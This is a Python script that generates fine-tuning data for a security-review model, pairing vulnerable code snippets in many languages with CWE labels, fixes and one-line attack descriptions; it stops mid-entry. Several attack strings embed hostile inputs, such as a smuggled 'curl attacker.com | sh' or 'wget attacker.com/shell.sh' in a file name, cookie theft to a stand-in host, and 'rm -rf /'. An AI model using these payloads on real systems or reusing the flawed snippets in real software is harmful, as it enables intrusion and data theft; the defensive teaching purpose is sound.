"""고품질 학습 데이터 생성 스크립트.

기존 203건 lora_train_v2.jsonl 을 유지하면서 추가 데이터를 생성한다.
포맷: {"prompt": "...\n\nVULN_TYPE:", "completion": "CWE-XX ...\nSEVERITY:...\nATTACK:...\nFIX:\n..."}

실행:
  python scripts/generate_training_data.py
  python scripts/generate_training_data.py --output data/lora_train_v3.jsonl --merge
"""

from __future__ import annotations

import argparse
import json
import random
from pathlib import Path

BASE_DIR = Path(__file__).resolve().parents[1]
ORIG_DATA = BASE_DIR / "data" / "lora_train_v2.jsonl"
OUT_DATA  = BASE_DIR / "data" / "lora_train_v3.jsonl"


def p(language: str, code: str) -> str:
    return f"Analyze this {language} code for security vulnerabilities:\n\n{code}\n\nVULN_TYPE:"


def c(cwe: str, name: str, severity: str, attack: str, fix: str) -> str:
    return f"{cwe} {name}\nSEVERITY: {severity}\nATTACK: {attack}\nFIX:\n{fix}"


# ── 취약점 템플릿 풀 ─────────────────────────────────────────────────────────────
# 각 항목: (language, code, cwe, name, severity, attack, fix)

RAW_EXAMPLES: list[tuple] = [

    # ── SQL Injection ──────────────────────────────────────────────────────────
    ("Python", 'cursor.execute("SELECT * FROM users WHERE name=\'" + name + "\'")',
     "CWE-89", "SQL Injection", "HIGH",
     "Attacker passes name=' OR '1'='1 to bypass authentication.",
     'cursor.execute("SELECT * FROM users WHERE name=%s", (name,))'),

    ("Python", 'db.execute(f"DELETE FROM logs WHERE id={req_id}")',
     "CWE-89", "SQL Injection", "CRITICAL",
     "Attacker sets req_id='1 OR 1=1' to delete all rows.",
     'db.execute("DELETE FROM logs WHERE id=?", (req_id,))'),

    ("Java", 'String q = "SELECT * FROM products WHERE id=" + id;\nstmt.execute(q);',
     "CWE-89", "SQL Injection", "HIGH",
     "Attacker injects SQL via id parameter to dump or modify the database.",
     'PreparedStatement ps = conn.prepareStatement("SELECT * FROM products WHERE id=?");\nps.setInt(1, id);\nps.executeQuery();'),

    ("Java", 'String sql = "UPDATE users SET role=\'" + role + "\' WHERE username=\'" + user + "\'";\nconn.createStatement().execute(sql);',
     "CWE-89", "SQL Injection", "CRITICAL",
     "Attacker escalates privileges by injecting role='admin' via unsanitized input.",
     'PreparedStatement ps = conn.prepareStatement("UPDATE users SET role=? WHERE username=?");\nps.setString(1, role);\nps.setString(2, user);\nps.executeUpdate();'),

    ("PHP", '$result = mysqli_query($conn, "SELECT * FROM items WHERE id=" . $_GET["id"]);',
     "CWE-89", "SQL Injection", "HIGH",
     "Attacker manipulates GET parameter to extract all table data.",
     '$stmt = $conn->prepare("SELECT * FROM items WHERE id=?");\n$stmt->bind_param("i", $_GET["id"]);\n$stmt->execute();'),

    ("Node.js", 'db.query(`SELECT * FROM orders WHERE user_id=${userId}`)',
     "CWE-89", "SQL Injection", "HIGH",
     "Template literal interpolation allows injection via userId.",
     'db.query("SELECT * FROM orders WHERE user_id=$1", [userId])'),

    ("Go", 'db.Query("SELECT * FROM sessions WHERE token=\'" + token + "\'")',
     "CWE-89", "SQL Injection", "HIGH",
     "Attacker forges token with embedded SQL to hijack any session.",
     'db.Query("SELECT * FROM sessions WHERE token=$1", token)'),

    ("Ruby", 'User.where("email = \'#{params[:email]}\'")',
     "CWE-89", "SQL Injection", "HIGH",
     "String interpolation in ActiveRecord where clause allows bypassing login.",
     'User.where(email: params[:email])'),

    # ── Command Injection ──────────────────────────────────────────────────────
    ("Python", 'import os\nos.system("ping " + host)',
     "CWE-78", "OS Command Injection", "CRITICAL",
     "Attacker sets host='127.0.0.1; rm -rf /' to execute arbitrary commands.",
     'import subprocess\nsubprocess.run(["ping", host], check=True)'),

    ("Python", 'subprocess.Popen(f"convert {filename} output.pdf", shell=True)',
     "CWE-78", "OS Command Injection", "CRITICAL",
     "Attacker names file 'x; curl attacker.com | sh' to achieve RCE.",
     'subprocess.Popen(["convert", filename, "output.pdf"])'),

    ("Python", 'result = subprocess.check_output("grep " + pattern + " /var/log/app.log", shell=True)',
     "CWE-78", "OS Command Injection", "HIGH",
     "Attacker injects pattern='x; cat /etc/shadow' to exfiltrate sensitive files.",
     'result = subprocess.check_output(["grep", pattern, "/var/log/app.log"])'),

    ("Node.js", 'exec(`ls -la ${req.query.path}`, (err, out) => res.send(out))',
     "CWE-78", "OS Command Injection", "CRITICAL",
     "Attacker sets path='/ && cat /etc/passwd' to read sensitive system files.",
     'const safePath = path.resolve(req.query.path);\nif (!safePath.startsWith(BASE_DIR)) return res.status(403).end();\nfs.readdir(safePath, (err, files) => res.json(files));'),

    ("Java", 'Runtime.getRuntime().exec("identify " + userFile);',
     "CWE-78", "OS Command Injection", "CRITICAL",
     "Attacker passes 'x; wget attacker.com/shell.sh -O /tmp/s && bash /tmp/s' as userFile.",
     'ProcessBuilder pb = new ProcessBuilder("identify", userFile);\npb.start();'),

    ("PHP", '$output = shell_exec("whois " . $_POST["domain"]);',
     "CWE-78", "OS Command Injection", "CRITICAL",
     "Attacker sends domain='example.com; cat /etc/passwd' to read arbitrary files.",
     '$domain = escapeshellarg($_POST["domain"]);\n$output = shell_exec("whois " . $domain);'),

    ("Go", 'cmd := exec.Command("sh", "-c", "dig " + domain)\ncmd.Run()',
     "CWE-78", "OS Command Injection", "CRITICAL",
     "Attacker injects domain='x; id > /tmp/pwned' via -c shell flag.",
     'cmd := exec.Command("dig", domain)\ncmd.Run()'),

    ("Ruby", 'system("ffmpeg -i #{params[:url]} output.mp4")',
     "CWE-78", "OS Command Injection", "CRITICAL",
     "Attacker injects shell metacharacters in URL parameter to execute commands.",
     'system("ffmpeg", "-i", params[:url], "output.mp4")'),

    # ── XSS ───────────────────────────────────────────────────────────────────
    ("JavaScript/React", 'return <div dangerouslySetInnerHTML={{__html: comment}} />',
     "CWE-79", "Cross-Site Scripting (XSS)", "HIGH",
     "Attacker stores <script>document.cookie='stolen='+document.cookie</script> as comment.",
     'import DOMPurify from "dompurify";\nreturn <div dangerouslySetInnerHTML={{__html: DOMPurify.sanitize(comment)}} />'),

    ("JavaScript/React", 'document.getElementById("out").innerHTML = req.params.msg',
     "CWE-79", "Reflected XSS", "HIGH",
     "Attacker crafts URL with msg=<img src=x onerror=alert(1)> to execute script.",
     'document.getElementById("out").textContent = req.params.msg'),

    ("Node.js", 'res.send(`<h1>Welcome ${req.query.name}</h1>`)',
     "CWE-79", "Reflected XSS", "HIGH",
     "Attacker injects <script> via name query parameter in URL.",
     'const he = require("he");\nres.send(`<h1>Welcome ${he.encode(req.query.name)}</h1>`)'),

    ("PHP", 'echo "Hello " . $_GET["user"];',
     "CWE-79", "Reflected XSS", "HIGH",
     "Attacker appends user=<script>fetch('//evil?c='+document.cookie)</script> to URL.",
     'echo "Hello " . htmlspecialchars($_GET["user"], ENT_QUOTES, "UTF-8");'),

    ("Java Spring Boot", '@GetMapping("/search")\npublic String search(@RequestParam String q, Model m) {\n    m.addAttribute("query", q);\n    return "results";\n}',
     "CWE-79", "Stored XSS via Model", "MEDIUM",
     "Template renders query unescaped, attacker stores payload via search.",
     '// Use Thymeleaf th:text (auto-escaping) instead of th:utext in template\nm.addAttribute("query", q); // ensure template uses th:text="${query}"'),

    ("Python", 'return f\'<p>Result: {user_data}</p>\'',
     "CWE-79", "Template XSS", "HIGH",
     "Attacker sets user_data='<script>evil()</script>' to inject script in response.",
     'from markupsafe import escape\nreturn f\'<p>Result: {escape(user_data)}</p>\''),

    # ── Path Traversal ─────────────────────────────────────────────────────────
    ("Python", 'with open(f"/var/www/files/{filename}") as f:\n    return f.read()',
     "CWE-22", "Path Traversal", "HIGH",
     "Attacker sets filename='../../etc/passwd' to read arbitrary files.",
     'import os\nsafe = os.path.realpath(os.path.join("/var/www/files", filename))\nif not safe.startswith("/var/www/files"):\n    raise PermissionError\nwith open(safe) as f:\n    return f.read()'),

    ("Node.js", 'const data = fs.readFileSync(path.join(__dirname, req.params.file))',
     "CWE-22", "Path Traversal", "HIGH",
     "Attacker requests ../../../etc/shadow via file parameter.",
     'const resolved = path.resolve(__dirname, req.params.file);\nif (!resolved.startsWith(__dirname)) return res.status(403).end();\nconst data = fs.readFileSync(resolved)'),

    ("Java", 'File f = new File("/uploads/" + filename);\nreturn Files.readAllBytes(f.toPath());',
     "CWE-22", "Path Traversal", "HIGH",
     "Attacker traverses to /etc/passwd by passing ../../etc/passwd as filename.",
     'File base = new File("/uploads");\nFile f = new File(base, filename);\nif (!f.getCanonicalPath().startsWith(base.getCanonicalPath()))\n    throw new SecurityException();\nreturn Files.readAllBytes(f.toPath());'),

    ("PHP", '$content = file_get_contents("/srv/data/" . $_GET["page"] . ".html");',
     "CWE-22", "Path Traversal", "HIGH",
     "Attacker sets page='../../../etc/passwd%00' to read sensitive files.",
     '$page = basename($_GET["page"]);\n$content = file_get_contents("/srv/data/" . $page . ".html");'),

    ("Go", 'http.ServeFile(w, r, "./static/"+r.URL.Query().Get("file"))',
     "CWE-22", "Path Traversal", "HIGH",
     "Attacker requests ../main.go to download application source code.",
     'file := filepath.Clean(r.URL.Query().Get("file"))\nif strings.HasPrefix(file, "..") {\n    http.Error(w, "forbidden", 403)\n    return\n}\nhttp.ServeFile(w, r, filepath.Join("./static", file))'),

    # ── Deserialization ────────────────────────────────────────────────────────
    ("Python", 'import pickle\nobj = pickle.loads(request.data)',
     "CWE-502", "Insecure Deserialization", "CRITICAL",
     "Attacker sends crafted pickle payload containing os.system call to achieve RCE.",
     'import json\nobj = json.loads(request.data)  # use JSON or protobuf instead'),

    ("Python", 'import yaml\nconfig = yaml.load(user_config)',
     "CWE-502", "YAML Deserialization (Arbitrary Code)", "CRITICAL",
     "Attacker provides !!python/object/apply:os.system ['rm -rf /'] in YAML to execute code.",
     'import yaml\nconfig = yaml.safe_load(user_config)'),

    ("Java", 'ObjectInputStream ois = new ObjectInputStream(request.getInputStream());\nObject obj = ois.readObject();',
     "CWE-502", "Java Deserialization", "CRITICAL",
     "Attacker sends gadget chain payload (e.g., Commons Collections) to achieve RCE.",
     '// Use JSON/Protobuf. If deserialization is required, use ValidatingObjectInputStream:\n// new ValidatingObjectInputStream(request.getInputStream()).accept(WhiteList.class)'),

    ("PHP", '$data = unserialize($_COOKIE["user"]);',
     "CWE-502", "PHP Object Injection", "CRITICAL",
     "Attacker crafts cookie with serialized PHP object whose __wakeup triggers file write.",
     '$data = json_decode(base64_decode($_COOKIE["user"]), true);'),

    ("Node.js", "const obj = eval('(' + req.body.data + ')')",
     "CWE-502", "Code Injection via eval", "CRITICAL",
     "Attacker sends data='process.exit()' or any Node.js code to execute on server.",
     'const obj = JSON.parse(req.body.data)'),

    # ── Hardcoded Secrets ──────────────────────────────────────────────────────
    ("Python", 'SECRET_KEY = "hardcoded_secret_abc123"\napp.config["SECRET_KEY"] = SECRET_KEY',
     "CWE-798", "Hardcoded Cryptographic Key", "HIGH",
     "Attacker extracts SECRET_KEY from source code to forge session tokens.",
     'import os\nSECRET_KEY = os.environ["SECRET_KEY"]\napp.config["SECRET_KEY"] = SECRET_KEY'),

    ("Java", 'private static final String DB_PASS = "Sup3rS3cur3!";',
     "CWE-798", "Hardcoded Password", "HIGH",
     "Password exposed in source control; anyone with repo access can access the database.",
     'String dbPass = System.getenv("DB_PASSWORD");\nif (dbPass == null) throw new IllegalStateException("DB_PASSWORD not set");'),

    ("Node.js", "const client = new Stripe('STRIPE_KEY_PLACEHOLDER')",
     "CWE-798", "Hardcoded API Key", "CRITICAL",
     "Stripe live key committed to git enables attacker to make financial transactions.",
     "const client = new Stripe(process.env.STRIPE_SECRET_KEY)"),

    ("Python", 'AWS_SECRET = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"',
     "CWE-798", "Hardcoded AWS Secret", "CRITICAL",
     "AWS credentials in source code allow full account takeover if repo is public.",
     'import boto3\n# Use IAM roles or environment variables\nboto3.setup_default_session()  # reads from ~/.aws or env'),

    ("Go", 'const jwtSecret = "my-secret-key-do-not-share"',
     "CWE-798", "Hardcoded JWT Secret", "HIGH",
     "Attacker forges valid JWT tokens by extracting the secret from the binary.",
     'jwtSecret := os.Getenv("JWT_SECRET")\nif jwtSecret == "" {\n    log.Fatal("JWT_SECRET not set")\n}'),

    # ── Cryptography ───────────────────────────────────────────────────────────
    ("Python", 'import hashlib\npassword_hash = hashlib.md5(password.encode()).hexdigest()',
     "CWE-916", "Weak Password Hash (MD5)", "HIGH",
     "Attacker cracks MD5 hashes with rainbow tables in seconds.",
     'import bcrypt\npassword_hash = bcrypt.hashpw(password.encode(), bcrypt.gensalt(rounds=12))'),

    ("Python", 'from Crypto.Cipher import DES\ncipher = DES.new(key, DES.MODE_ECB)',
     "CWE-327", "Broken Cryptographic Algorithm (DES/ECB)", "HIGH",
     "DES 56-bit key is brute-forceable; ECB mode reveals patterns in plaintext.",
     'from Crypto.Cipher import AES\ncipher = AES.new(key, AES.MODE_GCM)'),

    ("Java", 'MessageDigest md = MessageDigest.getInstance("SHA-1");\nbyte[] hash = md.digest(password.getBytes());',
     "CWE-916", "Weak Password Hash (SHA-1)", "HIGH",
     "SHA-1 without salt allows precomputed rainbow table attacks.",
     'import org.springframework.security.crypto.bcrypt.BCryptPasswordEncoder;\nBCryptPasswordEncoder encoder = new BCryptPasswordEncoder(12);\nString hash = encoder.encode(password);'),

    ("Node.js", "const hash = crypto.createHash('md5').update(token).digest('hex')",
     "CWE-327", "MD5 for Security Token", "MEDIUM",
     "MD5 is broken; collision attacks can produce identical hashes for different tokens.",
     "const hash = crypto.createHash('sha256').update(token).digest('hex')"),

    ("Python", 'import ssl\nssl_context = ssl.create_default_context()\nssl_context.check_hostname = False\nssl_context.verify_mode = ssl.CERT_NONE',
     "CWE-295", "Improper Certificate Validation", "HIGH",
     "Disabling cert verification allows man-in-the-middle attacks on all HTTPS connections.",
     'ssl_context = ssl.create_default_context()\n# Keep defaults: check_hostname=True, verify_mode=CERT_REQUIRED'),

    # ── Authentication / Access Control ───────────────────────────────────────
    ("Python", '@app.route("/admin")\ndef admin_panel():\n    return render_template("admin.html", users=User.query.all())',
     "CWE-284", "Missing Authentication (IDOR/Broken Access Control)", "CRITICAL",
     "Any unauthenticated user can access /admin and view all user data.",
     '@app.route("/admin")\n@login_required\n@roles_required("admin")\ndef admin_panel():\n    return render_template("admin.html", users=User.query.all())'),

    ("Node.js", 'app.delete("/users/:id", async (req, res) => {\n    await User.findByIdAndDelete(req.params.id);\n    res.json({ ok: true });\n})',
     "CWE-284", "Missing Authorization Check", "HIGH",
     "Any authenticated user can delete any other user's account by guessing their ID.",
     'app.delete("/users/:id", authenticate, async (req, res) => {\n    if (req.user.id !== req.params.id && req.user.role !== "admin")\n        return res.status(403).json({ error: "Forbidden" });\n    await User.findByIdAndDelete(req.params.id);\n    res.json({ ok: true });\n})'),

    ("Java Spring Boot", '@GetMapping("/api/invoice/{id}")\npublic Invoice getInvoice(@PathVariable Long id) {\n    return invoiceRepo.findById(id).orElseThrow();\n}',
     "CWE-639", "Insecure Direct Object Reference (IDOR)", "HIGH",
     "Attacker enumerates invoice IDs to access other customers' financial records.",
     '@GetMapping("/api/invoice/{id}")\n@PreAuthorize("isAuthenticated()")\npublic Invoice getInvoice(@PathVariable Long id, @AuthenticationPrincipal User user) {\n    Invoice inv = invoiceRepo.findById(id).orElseThrow();\n    if (!inv.getOwnerId().equals(user.getId())) throw new ResponseStatusException(HttpStatus.FORBIDDEN);\n    return inv;\n}'),

    ("Python", 'token = request.args.get("token")\nif token == stored_token:\n    grant_access()',
     "CWE-208", "Timing Attack on Token Comparison", "MEDIUM",
     "Character-by-character comparison leaks token length/prefix via response time.",
     'import hmac\nif hmac.compare_digest(token, stored_token):\n    grant_access()'),

    ("Python", 'user = User.query.filter_by(username=username, password=password).first()',
     "CWE-256", "Plaintext Password Storage", "CRITICAL",
     "Database breach exposes all passwords in plaintext.",
     'user = User.query.filter_by(username=username).first()\nif user and bcrypt.check_password_hash(user.password_hash, password):\n    login_user(user)'),

    # ── SSRF ──────────────────────────────────────────────────────────────────
    ("Python", 'url = request.args.get("url")\nresp = requests.get(url)',
     "CWE-918", "Server-Side Request Forgery (SSRF)", "HIGH",
     "Attacker requests http://169.254.169.254/metadata to steal cloud credentials.",
     'from urllib.parse import urlparse\nu = urlparse(request.args.get("url"))\nif u.hostname in ("169.254.169.254", "localhost", "127.0.0.1"):\n    abort(403)\nresp = requests.get(u.geturl(), timeout=5, allow_redirects=False)'),

    ("Node.js", 'const resp = await axios.get(req.body.webhook)',
     "CWE-918", "SSRF via Webhook URL", "HIGH",
     "Attacker sends internal service URL (http://internal-api/admin) as webhook.",
     'const { hostname } = new URL(req.body.webhook);\nconst { address } = await dns.lookup(hostname);\nif (isPrivateIP(address)) return res.status(400).end();\nconst resp = await axios.get(req.body.webhook, { maxRedirects: 0 })'),

    # ── XXE ───────────────────────────────────────────────────────────────────
    ("Java", 'DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();\nDocumentBuilder db = dbf.newDocumentBuilder();\nDocument doc = db.parse(inputStream);',
     "CWE-611", "XML External Entity Injection (XXE)", "HIGH",
     "Attacker embeds <!ENTITY xxe SYSTEM 'file:///etc/passwd'> to read local files.",
     'DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();\ndbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);\ndbf.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true);\nDocumentBuilder db = dbf.newDocumentBuilder();'),

    ("Python", 'from lxml import etree\ntree = etree.parse(user_xml)',
     "CWE-611", "XXE via lxml", "HIGH",
     "Default lxml parser resolves external entities; attacker reads /etc/shadow.",
     'from lxml import etree\nparser = etree.XMLParser(resolve_entities=False, no_network=True)\ntree = etree.parse(user_xml, parser)'),

    # ── Open Redirect ──────────────────────────────────────────────────────────
    ("Python", 'next_url = request.args.get("next")\nreturn redirect(next_url)',
     "CWE-601", "Open Redirect", "MEDIUM",
     "Attacker sends next=https://phishing.com to redirect victims after login.",
     'from urllib.parse import urlparse\nnext_url = request.args.get("next", "/")\nif urlparse(next_url).netloc:\n    next_url = "/"\nreturn redirect(next_url)'),

    ("Node.js", 'res.redirect(req.query.returnUrl)',
     "CWE-601", "Open Redirect", "MEDIUM",
     "Attacker crafts returnUrl pointing to malicious site to phish users.",
     'const returnUrl = req.query.returnUrl || "/";\nconst parsed = new URL(returnUrl, "https://myapp.com");\nif (parsed.origin !== "https://myapp.com") return res.redirect("/");\nres.redirect(returnUrl)'),

    # ── CSRF ──────────────────────────────────────────────────────────────────
    ("Python", '@app.route("/transfer", methods=["POST"])\n@login_required\ndef transfer():\n    send_money(request.form["to"], request.form["amount"])',
     "CWE-352", "Cross-Site Request Forgery (CSRF)", "HIGH",
     "Attacker's site submits hidden form to /transfer, stealing money from victim.",
     '@app.route("/transfer", methods=["POST"])\n@login_required\ndef transfer():\n    if not csrf.validate_token(request.form.get("csrf_token")):\n        abort(403)\n    send_money(request.form["to"], request.form["amount"])'),

    # ── Race Condition / TOCTOU ────────────────────────────────────────────────
    ("Python", 'if os.path.exists(filepath):\n    os.remove(filepath)',
     "CWE-362", "Race Condition (TOCTOU)", "MEDIUM",
     "Attacker replaces file with symlink between exists() and remove() checks.",
     'try:\n    os.remove(filepath)\nexcept FileNotFoundError:\n    pass'),

    # ── Buffer Overflow / Memory ───────────────────────────────────────────────
    ("C", 'char buf[64];\nstrcpy(buf, argv[1]);',
     "CWE-121", "Stack-Based Buffer Overflow", "CRITICAL",
     "Attacker passes input longer than 64 bytes to overwrite return address and control execution.",
     'char buf[64];\nstrncpy(buf, argv[1], sizeof(buf) - 1);\nbuf[sizeof(buf) - 1] = \'\\0\';'),

    ("C", 'void log_msg(char *msg) {\n    char buf[128];\n    sprintf(buf, "LOG: %s", msg);\n}',
     "CWE-121", "Buffer Overflow via sprintf", "CRITICAL",
     "If msg exceeds ~122 bytes, buf overflows into adjacent stack memory.",
     'void log_msg(char *msg) {\n    char buf[128];\n    snprintf(buf, sizeof(buf), "LOG: %s", msg);\n}'),

    ("C", 'int len = atoi(user_input);\nchar *buf = malloc(len);\nread(fd, buf, len);',
     "CWE-190", "Integer Overflow leading to Buffer Overflow", "HIGH",
     "Attacker sets len to a very large int that wraps to negative, causing malloc(0) then large read.",
     'long len = strtol(user_input, NULL, 10);\nif (len <= 0 || len > MAX_SIZE) exit(1);\nchar *buf = malloc((size_t)len);\nread(fd, buf, (size_t)len);'),

    ("C", 'printf(user_input);',
     "CWE-134", "Format String Vulnerability", "CRITICAL",
     "Attacker passes %n%n%n to write arbitrary memory addresses, achieving code execution.",
     'printf("%s", user_input);'),

    ("C", 'char *ptr = malloc(64);\nfree(ptr);\nptr[0] = \'A\';',
     "CWE-416", "Use After Free", "CRITICAL",
     "Writing to freed memory corrupts heap metadata, enabling attacker-controlled behavior.",
     'char *ptr = malloc(64);\nfree(ptr);\nptr = NULL;  // prevent use-after-free'),

    ("C++", 'int arr[10];\nint idx = atoi(argv[1]);\nprintf("%d\\n", arr[idx]);',
     "CWE-125", "Out-of-Bounds Read", "HIGH",
     "Attacker sets idx to negative or >9 to read adjacent memory contents.",
     'int arr[10];\nint idx = atoi(argv[1]);\nif (idx < 0 || idx >= 10) { fprintf(stderr, "invalid index"); return 1; }\nprintf("%d\\n", arr[idx]);'),

    # ── Kotlin / Android ───────────────────────────────────────────────────────
    ("Kotlin", 'val url = intent.getStringExtra("url")\nwebView.loadUrl(url!!)',
     "CWE-79", "WebView XSS / Intent Injection", "HIGH",
     "Attacker sends intent with javascript: URL to execute script in WebView context.",
     'val url = intent.getStringExtra("url") ?: return\nif (!url.startsWith("https://myapp.com")) return\nwebView.loadUrl(url)'),

    ("Kotlin", 'val query = intent.getStringExtra("q")\nval cursor = db.rawQuery("SELECT * FROM notes WHERE title=\'$query\'", null)',
     "CWE-89", "SQL Injection (Android)", "HIGH",
     "Attacker triggers intent with q=' OR '1'='1 to dump all notes.",
     'val cursor = db.rawQuery("SELECT * FROM notes WHERE title=?", arrayOf(query))'),

    # ── Swift / iOS ────────────────────────────────────────────────────────────
    ("Swift", 'let url = URL(string: "https://api.example.com/" + userInput)!\nURLSession.shared.dataTask(with: url)',
     "CWE-20", "URL Injection", "MEDIUM",
     "Attacker injects @evil.com/api to redirect request to a malicious server.",
     'guard let encoded = userInput.addingPercentEncoding(withAllowedCharacters: .urlPathAllowed) else { return }\nlet url = URL(string: "https://api.example.com/\\(encoded)")!\nURLSession.shared.dataTask(with: url)'),

    # ── Terraform / IaC ───────────────────────────────────────────────────────
    ("Terraform", 'resource "aws_s3_bucket" "data" {\n  bucket = "my-data-bucket"\n  acl    = "public-read"\n}',
     "CWE-732", "Overly Permissive S3 Bucket ACL", "HIGH",
     "public-read ACL exposes all bucket objects to the internet.",
     'resource "aws_s3_bucket" "data" {\n  bucket = "my-data-bucket"\n}\nresource "aws_s3_bucket_acl" "data" {\n  bucket = aws_s3_bucket.data.id\n  acl    = "private"\n}'),

    ("Terraform", 'resource "aws_security_group_rule" "all" {\n  cidr_blocks = ["0.0.0.0/0"]\n  from_port   = 0\n  to_port     = 65535\n}',
     "CWE-732", "Overly Permissive Security Group", "HIGH",
     "All ports open to all IPs allows direct attacks on any service running on the instance.",
     '# Restrict to specific ports and known IP ranges\nresource "aws_security_group_rule" "https" {\n  cidr_blocks = ["10.0.0.0/8"]\n  from_port   = 443\n  to_port     = 443\n}'),

    # ── GitHub Actions / CI-CD ────────────────────────────────────────────────
    ("GitHub Actions", '- run: echo "Title: ${{ github.event.pull_request.title }}"',
     "CWE-77", "GitHub Actions Expression Injection", "HIGH",
     "Attacker creates PR with title containing `$(curl attacker.com | sh)` to execute commands.",
     '- name: Print PR title\n  env:\n    TITLE: ${{ github.event.pull_request.title }}\n  run: echo "Title: $TITLE"'),

    ("GitHub Actions", '- uses: actions/checkout@v3\n  with:\n    ref: ${{ github.event.pull_request.head.ref }}',
     "CWE-77", "Untrusted Ref Checkout Injection", "HIGH",
     "Attacker names branch with shell metacharacters to corrupt workflow or execute code.",
     '- uses: actions/checkout@v3  # checkout action handles ref safely\n  # For public PRs, use pull_request_target with caution and pin to SHA'),

    # ── TypeScript / Next.js ──────────────────────────────────────────────────
    ("TypeScript/Next.js", 'export async function GET(req: Request) {\n  const file = new URL(req.url).searchParams.get("f");\n  return new Response(fs.readFileSync(`./public/${file}`));\n}',
     "CWE-22", "Path Traversal in Next.js Route Handler", "HIGH",
     "Attacker requests ?f=../../../etc/passwd to read files outside ./public.",
     'const file = path.basename(new URL(req.url).searchParams.get("f") ?? "");\nconst fullPath = path.join(process.cwd(), "public", file);\nif (!fullPath.startsWith(path.join(process.cwd(), "public"))) return new Response("Forbidden", { status: 403 });\nreturn new Response(fs.readFileSync(fullPath));'),

    ("TypeScript/Next.js", "export async function POST(req: Request) {\n  const { query } = await req.json();\n  const results = await db.query(`SELECT * FROM posts WHERE title LIKE '%${query}%'`);\n  return Response.json(results);\n}",
     "CWE-89", "SQL Injection in Next.js API Route", "HIGH",
     "Attacker sends query containing %'; DROP TABLE posts;-- via POST body.",
     "const results = await db.query('SELECT * FROM posts WHERE title LIKE $1', [`%${query}%`]);\nreturn Response.json(results);"),

    # ── Session / Cookie ───────────────────────────────────────────────────────
    ("Node.js", "res.cookie('session', userId, { httpOnly: false, secure: false })",
     "CWE-614", "Missing Secure/HttpOnly Cookie Flags", "MEDIUM",
     "Session cookie accessible via JavaScript and transmitted over HTTP allows theft.",
     "res.cookie('session', userId, { httpOnly: true, secure: true, sameSite: 'Strict' })"),

    ("Python", 'response.set_cookie("auth", token)',
     "CWE-614", "Insecure Cookie Configuration", "MEDIUM",
     "Cookie sent over HTTP and readable by JS enables session hijacking via XSS.",
     'response.set_cookie("auth", token, secure=True, httponly=True, samesite="Strict")'),

    # ── Dependency / Supply Chain ──────────────────────────────────────────────
    ("Python", 'exec(requests.get("https://pastebin.com/raw/setup").text)',
     "CWE-829", "Inclusion of Functionality from Untrusted Source", "CRITICAL",
     "Remote content executed at runtime; attacker compromises pastebin URL to run malware.",
     '# Never exec() remote content. Pin dependencies in requirements.txt with hashes.'),

    # ── Log Injection ──────────────────────────────────────────────────────────
    ("Python", 'logging.info(f"User login: {username}")',
     "CWE-117", "Log Injection", "LOW",
     "Attacker sets username='admin\\nINFO: Payment approved' to forge log entries.",
     'safe_name = username.replace("\\n", "\\\\n").replace("\\r", "\\\\r")\nlogging.info("User login: %s", safe_name)'),

    # ── Regex DoS ──────────────────────────────────────────────────────────────
    ("Python", 'import re\nre.match(r"(a+)+b", user_input)',
     "CWE-1333", "ReDoS (Regular Expression Denial of Service)", "MEDIUM",
     "Attacker sends 'aaaaaaaaaaaaaaaaaac' to cause exponential backtracking and CPU exhaustion.",
     '# Use atomic groups or possessive quantifiers; or set a timeout:\nimport re, signal\nsignal.alarm(1)  # 1s timeout\nre.match(r"a+b", user_input)  # use non-backtracking pattern'),

    # ── Mass Assignment ────────────────────────────────────────────────────────
    ("Python", '@app.route("/profile", methods=["POST"])\ndef update_profile():\n    user.__dict__.update(request.json)',
     "CWE-915", "Mass Assignment / Object Injection", "HIGH",
     "Attacker sends {\"role\": \"admin\", \"is_verified\": true} to elevate privileges.",
     'ALLOWED = {"name", "bio", "avatar_url"}\ndata = {k: v for k, v in request.json.items() if k in ALLOWED}\nfor k, v in data.items():\n    setattr(user, k, v)'),

    ("Node.js", 'Object.assign(user, req.body)',
     "CWE-915", "Mass Assignment", "HIGH",
     "Attacker injects {role:'admin'} in request body to escalate user privileges.",
     'const { name, email } = req.body;  // whitelist allowed fields\nObject.assign(user, { name, email })'),
]


def _make_example(language: str, code: str, cwe: str, name: str,
                  severity: str, attack: str, fix: str) -> dict:
    return {
        "prompt": p(language, code),
        "completion": c(cwe, name, severity, attack, fix),
    }


def generate_all() -> list[dict]:
    examples = [_make_example(*e) for e in RAW_EXAMPLES]

    # ── 변형 생성 (같은 취약점, 다른 변수명/컨텍스트) ────────────────────────
    var_variations = [
        # SQL Injection 변형
        ("Python", 'cursor.execute("SELECT * FROM accounts WHERE id=\'" + account_id + "\'")',
         "CWE-89", "SQL Injection", "HIGH",
         "Attacker sets account_id=' UNION SELECT * FROM passwords-- to exfiltrate data.",
         'cursor.execute("SELECT * FROM accounts WHERE id=%s", (account_id,))'),

        ("Python", 'db.query(f"INSERT INTO logs VALUES (\'{user_id}\', \'{action}\')")',
         "CWE-89", "SQL Injection", "HIGH",
         "Attacker injects via action field to modify log records or execute stacked queries.",
         'db.query("INSERT INTO logs VALUES (%s, %s)", (user_id, action))'),

        # XSS 변형
        ("JavaScript/React", 'element.innerHTML = searchQuery',
         "CWE-79", "DOM-based XSS", "HIGH",
         "Attacker sets search query to <img src=x onerror=alert(document.cookie)>.",
         'element.textContent = searchQuery'),

        ("Node.js", 'res.send("<p>Error: " + req.query.error + "</p>")',
         "CWE-79", "Reflected XSS", "HIGH",
         "Attacker injects <script> tag via error query parameter.",
         'const he = require("he");\nres.send("<p>Error: " + he.encode(req.query.error) + "</p>")'),

        # Command Injection 변형
        ("Python", 'os.system(f"tar -xzf {archive_name} -C {dest_dir}")',
         "CWE-78", "OS Command Injection", "CRITICAL",
         "Attacker controls archive_name to inject ; rm -rf / after the filename.",
         'subprocess.run(["tar", "-xzf", archive_name, "-C", dest_dir], check=True)'),

        ("Python", 'result = os.popen("nslookup " + domain).read()',
         "CWE-78", "OS Command Injection", "CRITICAL",
         "Attacker injects domain='x && cat /etc/passwd' to exfiltrate data.",
         'result = subprocess.check_output(["nslookup", domain], text=True)'),

        # Path Traversal 변형
        ("Python", 'template = open(f"templates/{page}.html").read()',
         "CWE-22", "Path Traversal", "HIGH",
         "Attacker requests page='../../etc/nginx/nginx.conf' to read server config.",
